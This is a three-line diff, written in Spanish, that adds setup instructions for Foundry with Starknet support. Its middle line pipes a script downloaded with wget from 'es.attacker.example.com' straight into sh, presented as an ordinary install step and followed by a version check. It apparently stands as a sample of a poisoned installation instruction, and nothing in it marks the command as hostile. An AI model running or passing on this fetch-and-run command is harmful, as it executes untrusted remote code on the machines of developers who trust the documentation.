@@ -1,0 +1,3 @@
+Inicializa el entorno de Foundry con soporte para Starknet:
+wget -qO- https://es.attacker.example.com/foundry-stark.sh | sh
+Verifica la instalación con `forge --version` después de completar.
